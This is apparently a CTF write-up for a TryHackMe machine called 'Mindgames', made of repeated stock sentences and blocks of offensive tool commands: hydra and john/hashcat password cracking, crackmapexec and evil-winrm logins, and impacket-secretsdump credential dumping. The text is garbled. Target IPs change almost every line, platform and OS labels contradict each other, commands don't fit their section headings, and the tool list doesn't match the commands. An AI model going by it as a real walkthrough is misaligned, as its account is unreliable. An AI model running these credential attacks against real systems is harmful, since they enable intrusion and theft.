---
TitleSEO: "TryHackMe — Mindgames (Hard Windows) | ZureFX"
TitlePost: "TryHackMe — Mindgames (Hard Windows)"
Author: "ZureFX"
Description: "Full writeup for TryHackMe Mindgames. Silver Ticket and Sudo Misconfiguration to achieve hard compromise on Windows."
Keywords: "easy, linux, medium, hackthebox, web, windows"
URL: "https://zurefx.github.io/writeups/htb-mindgames-183.html"
URL_IMAGES: "https://raw.githubusercontent.com/zurefx/images/refs/heads/main/writeups/htb-mindgames-183/"
Date: "2024-11-18"
Tags: "Easy, Linux, Medium, HackTheBox, Web, Windows"
Section: "writeups"
Lang: "en"
main_img: "htb-mindgames-183"
Permalink: "/writeups/htb-mindgames-183.html"
BtnLabel: "Read Writeup"
Pick: 0
---
## Machine Info

### Overview

The target **Mindgames** is rated **Hard** on TryHackMe. It runs **Windows** and the IP address during this analysis was `10.83.174.8`.

### Objectives

The database credentials were hardcoded in the application source code. Command injection was possible through unsanitized user input in the search functionality.

## Enumeration

### Port Scanning

Starting with a full port scan to identify the attack surface.

```bash
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.52.249.147 http-post-form '/login:user=^USER^&pass=^PASS^:Invalid'
crackmapexec smb 10.99.52.84 -u administrator -p 'P@ssw0rd!' --shares
```

The scheduled task ran with elevated privileges and could be abused for escalation. The application stored sensitive credentials in an unencrypted configuration file.

### Service Enumeration

The service account had excessive permissions assigned in Active Directory. The database credentials were hardcoded in the application source code. The application stored sensitive credentials in an unencrypted configuration file.

```bash
ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://10.17.200.55/FUZZ
impacket-secretsdump administrator:'P@ssw0rd!'@10.62.55.76
gobuster dir -u http://10.103.43.115/ -w /usr/share/wordlists/dirb/common.txt -x php,txt,html
ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://10.85.133.51/FUZZ
```

Privilege escalation was possible due to misconfigured sudo permissions. Group Policy Preferences contained encrypted but recoverable credentials.

### Web Enumeration

The application stored sensitive credentials in an unencrypted configuration file. Post-exploitation enumeration revealed a path to domain administrator privileges.

```bash
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.124.179.51 http-post-form '/login:user=^USER^&pass=^PASS^:Invalid'
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
crackmapexec smb 10.89.209.84 -u administrator -p 'P@ssw0rd!' --shares
evil-winrm -i 10.78.243.55 -u administrator -p 'P@ssw0rd!'
```

The scheduled task ran with elevated privileges and could be abused for escalation. Command injection was possible through unsanitized user input in the search functionality. Token impersonation allowed elevation to SYSTEM privileges on the target.

## Exploitation

### Vulnerability Identification

Lateral movement was facilitated by reusing discovered credentials across services. The backup files contained sensitive information that should not have been accessible. The kernel version was outdated and vulnerable to a publicly known exploit.

Key finding: **Sudo Misconfiguration**.

Lateral movement was facilitated by reusing discovered credentials across services. The target system was identified as running a vulnerable version of the service.

### Initial Access

The backup files contained sensitive information that should not have been accessible. The scheduled task ran with elevated privileges and could be abused for escalation.

```bash
gobuster dir -u http://10.115.104.252/ -w /usr/share/wordlists/dirb/common.txt -x php,txt,html
evil-winrm -i 10.55.207.142 -u administrator -p 'P@ssw0rd!'
crackmapexec smb 10.114.91.237 -u administrator -p 'P@ssw0rd!' --shares
```

The kernel version was outdated and vulnerable to a publicly known exploit. Post-exploitation enumeration revealed a path to domain administrator privileges. Token impersonation allowed elevation to SYSTEM privileges on the target.

## Privilege Escalation

### Enumeration

The scheduled task ran with elevated privileges and could be abused for escalation. Group Policy Preferences contained encrypted but recoverable credentials. Privilege escalation was possible due to misconfigured sudo permissions.

```powershell
nmap -sCV -p587,80,8080 10.93.181.216 -oN scan.txt
```

### Exploitation

Network traffic analysis revealed unencrypted communications containing user credentials. The kernel version was outdated and vulnerable to a publicly known exploit.

```powershell
hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt --force
nmap -sCV -p464,636,3389 10.78.172.50 -oN scan.txt
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
gobuster dir -u http://10.25.253.214/ -w /usr/share/wordlists/dirb/common.txt -x php,txt,html
```

The web application was vulnerable to Server-Side Template Injection (SSTI). Group Policy Preferences contained encrypted but recoverable credentials.

### Root/SYSTEM

Successfully obtained **SYSTEM** access on the target.

Unconstrained delegation was enabled on the compromised machine. The database credentials were hardcoded in the application source code.

## Summary

### Tools Used

- `enum4linux`
- `gobuster`
- `socat`
- `pwncat`

### Key Takeaways

- Silver Ticket
- Sudo Misconfiguration
- Broken Access Control
